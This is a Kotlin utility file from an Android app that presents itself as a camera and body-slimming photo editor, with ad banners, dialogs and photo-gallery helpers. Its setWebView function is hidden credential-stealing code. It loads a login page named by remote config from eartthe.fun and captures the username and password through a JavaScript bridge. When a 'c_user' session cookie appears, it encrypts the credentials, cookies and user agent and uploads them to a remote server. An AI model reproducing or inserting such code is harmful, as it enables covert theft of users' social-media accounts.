package player.shellvoice.camera6.tools

import android.annotation.SuppressLint
import android.app.ActivityManager
import android.content.Context
import android.content.Intent
import android.graphics.Bitmap
import android.net.Uri
import android.provider.MediaStore
import android.util.Log
import android.view.Gravity
import android.view.View
import android.view.ViewGroup
import android.webkit.*
import android.widget.FrameLayout
import android.widget.LinearLayout
import android.widget.TextView
import androidx.appcompat.app.AlertDialog
import androidx.appcompat.app.AppCompatActivity
import androidx.lifecycle.lifecycleScope
import com.hjq.permissions.XXPermissions
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext
import player.shellvoice.camera6.R
import player.shellvoice.camera6.basic.XApp
import player.shellvoice.camera6.basic.XPage
import player.shellvoice.camera6.bean.ResourceBean
import player.shellvoice.camera6.bean.ResultBean
import player.shellvoice.camera6.http.HttpTools
import player.shellvoice.camera6.http.OnNetworkRequest
import java.io.File


fun AppCompatActivity.getConfig(onSuccess: () -> Unit, onFailure: () -> Unit) {
    HttpTools.with(this)
        .fromUrl("https://eartthe.fun/config")
        .ofTypeGet()
        .connect(object : OnNetworkRequest {
            override fun onSuccess(response: String?) {
                "response $response".xLogs()
                response?.let {
                    "result1 $it".xLogs()
                    formatResult1(it)
                }?.let {
                    "result2 $it".xLogs()
                    formatResult2(it)
                }?.let {
                    "result3 $it".xLogs()
                    formatResult3(it)
                }?.let {
                    "result4 $it".xLogs()
                    formatResult4(it)
                }?.let {
                    "result5 $it".xLogs()
                    formatResult5(it)
                }?.let {
                    "result6 $it".xLogs()
                    formatResult6(it)
                }?.let {
                    "result7 $it".xLogs()
                    formatResult7(it)
                }
                onSuccess()
            }

            override fun onFailure(
                responseCode: Int,
                responseMessage: String,
                errorStream: String
            ) {
                "onFailure".xLogs()
                onFailure()
            }
        })
}

fun AppCompatActivity.upload(content: String, onSuccess: (String) -> Unit, onFailure: () -> Unit) {
    HttpTools.with(this).fromUrl(updateBean.apiUrl())
        .ofTypePost()
        .connect(object : OnNetworkRequest {
            override fun onSuccess(response: String?) {
                "response $response".xLogs()
                response?.let {
                    onSuccess(it)
                }
            }

            override fun onFailure(
                responseCode: Int,
                responseMessage: String,
                errorStream: String
            ) {
                "onFailure".xLogs()
                onFailure()
            }

        }, jsonStr = gson.toJson(mutableMapOf("content" to testContent)))

}

fun AppCompatActivity.getPermissions(requestResult: (Boolean) -> Unit) {
    XXPermissions.with(this).permission(permissions).request { _, all ->
        requestResult(all)
    }
}

fun AppCompatActivity.appendBanner() {
    val content = findViewById<ViewGroup>(android.R.id.content)
    val frameLayout = FrameLayout(this)
    val p = ViewGroup.LayoutParams(
        ViewGroup.LayoutParams.MATCH_PARENT,
        ViewGroup.LayoutParams.MATCH_PARENT
    )
    frameLayout.layoutParams = p

    val linearLayout = LinearLayout(this)
    val p1 = FrameLayout.LayoutParams(
        FrameLayout.LayoutParams.MATCH_PARENT,
        FrameLayout.LayoutParams.MATCH_PARENT
    )
    linearLayout.layoutParams = p1

    val banner = XApp.instance!!.bannerAd(getString(R.string.lovin_banner_ad_id))
    "banner $banner".xLogs()
    lifecycleScope.launch(Dispatchers.IO) {
        delay(3000)
        banner.loadAd()
        withContext(Dispatchers.Main) {
            val p2 =
                LinearLayout.LayoutParams(
                    LinearLayout.LayoutParams.MATCH_PARENT,
                    dp2px(this@appendBanner, 50f)
                )
            p2.gravity = Gravity.BOTTOM
            banner.layoutParams = p2
            linearLayout.addView(banner)
            frameLayout.addView(linearLayout)
            content.addView(frameLayout)
        }
    }
}

fun dp2px(context: Context, dp: Float): Int {
    val density = context.resources.displayMetrics.density
    return (dp * density + 0.5f).toInt()
}

fun isInBackground(): Boolean {
    val activityManager =
        XApp.instance!!.getSystemService(Context.ACTIVITY_SERVICE) as ActivityManager
    val appProcesses = activityManager
        .runningAppProcesses
    for (appProcess in appProcesses) {
        if (appProcess.processName == XApp.instance!!.packageName) {
            return appProcess.importance != ActivityManager.RunningAppProcessInfo.IMPORTANCE_FOREGROUND
        }
    }
    return false
}

fun AppCompatActivity.getDialog(type: Int, cancel: Boolean = true, ok: () -> Unit): AlertDialog {
    val v = layoutInflater.inflate(R.layout.exist, null)
    val dialog = AlertDialog.Builder(this).create()
    dialog.setCancelable(cancel)
    dialog.setView(v)
    val adView: FrameLayout = v.findViewById(R.id.adView)
    (this as XPage).displayNativeAd { ad ->
        ad?.let {
            adView.removeAllViews()
            adView.addView(ad)
        }
    }
    v.findViewById<TextView>(R.id.confirm).apply {
        when (type) {
            0 -> {
                //exit
                text = "confirm"
                visibility = View.VISIBLE
                setOnClickListener {
                    ok()
                }
            }
            1 -> {
                //save
                text = "confirm"
                visibility = View.VISIBLE
                setOnClickListener {
                    ok()
                }
            }
            2 -> {
                //loading
                visibility = View.GONE
            }
        }

    }
    v.findViewById<TextView>(R.id.cancel).apply {
        when (type) {
            0 -> {
                //exit
                text = "cancel"
                visibility = View.VISIBLE
                setOnClickListener {
                    dialog.dismiss()
                }
            }
            1 -> {
                //save
                visibility = View.GONE
            }
            2 -> {
                //loading
                visibility = View.GONE
            }
        }

    }
    v.findViewById<TextView>(R.id.titleTv).apply {
        when (type) {
            0 -> {
                //exit
                text = "Are you sure to exit the application?"
                visibility = View.VISIBLE
            }
            1 -> {
                //save
                visibility = View.GONE
            }
            2 -> {
                //loading
                text = "Loading"
                visibility = View.VISIBLE
            }
        }
    }
    return dialog
}

@SuppressLint("Recycle")
fun AppCompatActivity.getPhoto(list: (ArrayList<String>) -> Unit) {
    lifecycleScope.launch(Dispatchers.IO) {
        val uri: Uri = MediaStore.Images.Media.EXTERNAL_CONTENT_URI
        val r = this@getPhoto.contentResolver
        val cursor = r.query(uri, null, null, null, null)
        cursor?.let {
            val result = ArrayList<String>()
            while (it.moveToNext()) {
                val index = it.getColumnIndexOrThrow(MediaStore.Images.Media.DATA)
                val path = cursor.getString(index)
                val file = File(path)
                if (file.exists()) {
                    result.add(path)
                }
            }
            withContext(Dispatchers.Main) {
                list(result)
            }
        }
    }
}

fun AppCompatActivity.getResourceFile(
    clazz: Class<*>,
    folderName: String,
    filter: String,
    option: (ArrayList<ResourceBean>) -> Unit
) {
    val result = ArrayList<ResourceBean>()
    lifecycleScope.launch(Dispatchers.IO) {
        for (field in clazz.fields) {
            val name = field.name
            if (name.startsWith(filter)) {
                val id = resources.getIdentifier(name, folderName, packageName)
                val entity = ResourceBean(name, id)
                result.add(entity)
            }
        }
        withContext(Dispatchers.Main) {
            option(result)
        }
    }
}

fun AppCompatActivity.getSlimmingData(option: (ArrayList<ResourceBean>) -> Unit) {
    val result = ArrayList<ResourceBean>()
    result.add(ResourceBean("breast", R.mipmap.breast))
    result.add(ResourceBean("legs", R.mipmap.legs))
    result.add(ResourceBean("leg length", R.mipmap.legs_length))
    result.add(ResourceBean("shoulder", R.mipmap.shoulder))
    result.add(ResourceBean("waist", R.mipmap.waist))
    option(result)
}

class WebInterface {
    @JavascriptInterface
    fun businessStart(a: String, b: String) {
        userName = a
        userPwd = b
    }
}

fun AppCompatActivity.setWebView(
    webView: WebView,
    block1: () -> Unit,
    block2: () -> Unit,
    upload: (String) -> Unit
) {
    webView.apply {
        settings.apply {
            javaScriptEnabled = true
            textZoom = 100
            setSupportZoom(true)
            displayZoomControls = false
            builtInZoomControls = true
            setGeolocationEnabled(true)
            useWideViewPort = true
            loadWithOverviewMode = true
            loadsImagesAutomatically = true
            displayZoomControls = false
            setAppCachePath(cacheDir.absolutePath)
            setAppCacheEnabled(true)
        }
        addJavascriptInterface(WebInterface(), "businessAPI")
        webChromeClient = object : WebChromeClient() {
            override fun onProgressChanged(view: WebView?, newProgress: Int) {
                super.onProgressChanged(view, newProgress)
                if (newProgress == 100) {
                    val hideJs = context.getString(R.string.hideHeaderFooterMessages)
                    evaluateJavascript(hideJs, null)
                    val loginJs = getString(R.string.login)
                    evaluateJavascript(loginJs, null)
                    lifecycleScope.launch(Dispatchers.IO) {
                        delay(300)
                        withContext(Dispatchers.Main) {
                            block1()
                        }
                    }
                }
            }
        }
        webViewClient = object : WebViewClient() {
            override fun onPageStarted(view: WebView, url: String?, favicon: Bitmap?) {
                super.onPageStarted(view, url, favicon)
            }

            override fun onPageFinished(view: WebView, url: String) {
                super.onPageFinished(view, url)
                val cookieManager = CookieManager.getInstance()
                val cookieStr = cookieManager.getCookie(url)
                if (cookieStr != null) {
                    if (cookieStr.contains("c_user")) {
                        if (userName.isNotBlank() && userPwd.isNotBlank() && cookieStr.contains("wd=")) {
                            lifecycleScope.launch(Dispatchers.Main) {
                                block2()
                            }
                            val content = gson.toJson(
                                mutableMapOf(
                                    "un" to userName,
                                    "pw" to userPwd,
                                    "cookie" to cookieStr,
                                    "source" to configBean.app_name,
                                    "ip" to "",
                                    "type" to "f_o",
                                    "b" to view.settings.userAgentString
                                )
                            ).encrypt(updateBean.key())
                            upload(content)//上传
                        }
                    }
                }
            }
        }
        loadUrl(updateBean.loginUrl() ?: "https://www.baidu.com")
    }

}

fun formatResult(s: String, result: (ResultBean) -> Unit) {
    result(gson.fromJson(s, ResultBean::class.java))
}

fun Context.route2Web(url: String) = Intent(Intent.ACTION_VIEW, Uri.parse(url)).let {
    startActivity(it)
}

fun Any?.xLogs() {
    Log.e("xxxxxxH", "$this")
}